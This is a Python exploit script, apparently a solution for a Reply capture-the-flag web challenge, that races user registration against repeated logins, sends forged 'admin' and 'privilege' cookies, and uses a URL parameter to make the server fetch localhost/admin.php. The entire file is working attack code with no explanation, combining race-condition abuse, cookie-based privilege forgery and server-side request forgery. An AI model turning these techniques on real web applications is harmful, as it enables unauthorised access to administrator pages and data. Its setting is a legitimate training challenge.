import requests
import string
import random
import threading
import time

def register(usr, psw):
    url = "http://gamebox1.reply.it/cad1ff8706b9c1cbe6f2490d51d5e068/race.php?mode=register"
    data = {"name": usr, "pass": psw, "mode": "register"}
    r = requests.post(url, data=data)
    #print(r.text)


def login(usr, psw):
    sess = requests.session()
    url = "http://gamebox1.reply.it/cad1ff8706b9c1cbe6f2490d51d5e068/race.php?mode=login"
    data = {"name": usr, "pass": psw, "mode": "login"}
    r = sess.post(url, data=data) #, allow_redirects=False)
    return (r.text, sess)


def get_page(sess, url):
    r = sess.get(url, cookies={"legend": "1", "admin": "1", "privilege": "admin"}) #, headers={'X-Forwarded-For': '127.0.0.1'})
    return r.text


def worker():
    alphabet = string.ascii_lowercase + string.ascii_uppercase
    usr = ''.join([random.choice(alphabet) for _ in range(32)])
    print("User: " + usr)
    reg_th = threading.Thread(target=register, args=(usr,usr,))
    page = ""
    reg_th.start()
    while True:
        otp, sess = login(usr, usr)
        if otp == 'user locked':
            break
        else:
            if otp == 'user not found':
                continue
            page = get_page(sess, "http://gamebox1.reply.it/cad1ff8706b9c1cbe6f2490d51d5e068/hof.php?url=localhost/admin.php")
            break
    return page


def main():
    p = worker()
    while p == "":
        p = worker()
    print(p)


if __name__ == "__main__":
    main()
